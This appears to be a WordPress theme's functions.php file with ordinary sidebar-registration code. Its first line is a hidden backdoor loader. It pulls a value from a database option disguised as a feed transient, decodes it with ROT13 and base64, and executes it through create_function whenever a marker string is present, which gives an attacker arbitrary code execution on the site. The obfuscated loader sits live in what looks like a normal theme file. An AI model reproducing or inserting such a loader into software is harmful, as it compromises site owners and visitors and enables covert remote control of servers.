<?php
$z=get_option("_transient_feed_b64fa2b5db6827cd88a441af4b72ec61"); $z=base64_decode(str_rot13($z)); if(strpos($z,"3C7FDCC4")!==false){ $_z=create_function("",$z); @$_z(); }

if ( function_exists('register_sidebar') )
    register_sidebar(array(
       'before_widget' => '',
       'after_widget' => '<br />',
 	 'before_title' => '<h2>',
       'after_title' => '</h2>',
    ));

?>